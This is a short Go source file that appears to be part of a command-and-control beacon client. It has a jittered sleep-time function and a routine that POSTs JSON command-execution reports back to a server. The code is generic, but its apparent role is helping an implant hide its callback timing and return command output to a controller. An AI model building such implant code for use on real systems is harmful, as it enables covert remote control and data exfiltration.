package beaconhandler

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"time"

	httpFuncs "src/Client/beacon/http"
	"src/Client/generic/logger"
)

// calculateSleepTime determines the sleep duration based on a timer and jitter value.
func calculateSleepTime(timer float64, jitter float64) time.Duration {
	if jitter < 0 {
		jitter = 0
	}
	if timer < 0 {
		timer = 0
	}

	// Calculate a random jitter effect up to the jitter value.
	jitterEffect := 0.0
	if jitter > 0 {
		jitterEffect = rand.Float64() * jitter // Range [0, jitter]
	}

	// Randomly add or subtract the jitter effect.
	if rand.Intn(2) == 1 {
		timer += jitterEffect
	} else {
		timer -= jitterEffect
	}

	// Ensure sleep time is not negative.
	if timer < 0 {
		timer = 0
	}
	return time.Duration(timer) * time.Second
}

// postReportsToServer marshals and sends command reports back to the server.
func postReportsToServer(reports []httpFuncs.CommandReport) error {
	if len(reports) == 0 {
		return nil
	}
	logger.Log(fmt.Sprintf("Posting %d command report(s) to server.", len(reports)))

	payload := httpFuncs.ReportsToServerPayload{Reports: reports}
	jsonBytes, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("failed to marshal reports: %w", err)
	}

	reportURL := httpFuncs.GenerateResponseURL()
	_, _, postErr := httpFuncs.PostRequest(reportURL, string(jsonBytes), false)
	if postErr != nil {
		return fmt.Errorf("failed to post reports to %s: %w", reportURL, postErr)
	}

	logger.Log("Successfully posted command reports.")
	return nil
}
